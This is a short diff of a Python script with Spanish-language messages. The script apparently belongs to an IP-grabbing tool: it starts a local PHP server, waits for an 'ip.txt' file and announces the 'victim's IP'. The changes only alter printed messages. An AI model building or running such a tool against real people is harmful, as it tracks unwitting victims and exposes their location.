@@ -22,7 +22,7 @@ def cat():
 def check():
     while True:
         if os.path.isfile('ip.txt'):
-          print('[~] IP de la victima encontrado!')
+          print('\n\033[94m[~] IP de la victima encontrado!')
           with open('ip.txt') as ip:
             lines = ip.read().rstrip()
             if len(lines) != 0:
@@ -38,10 +38,12 @@ def server():
     if var == "Y" or var == "y":
         port = int(input('\n[~] Ingresa el puerto: '))
         print(f'\n[~] Utilizando el puerto {port}')
+        print('\n[~] Esperando datos...')
         os.system(f"php -S localhost:{port} > /dev/null 2>&1 &")
         check()
     elif var == "n" or var == "N":
         print('\n[~] Utilizando el puerto por default: 8080')
+        print('\n[~] Esperando datos...')
         os.system("php -S localhost:8080 > /dev/null 2>&1 &")
         check()
     else:
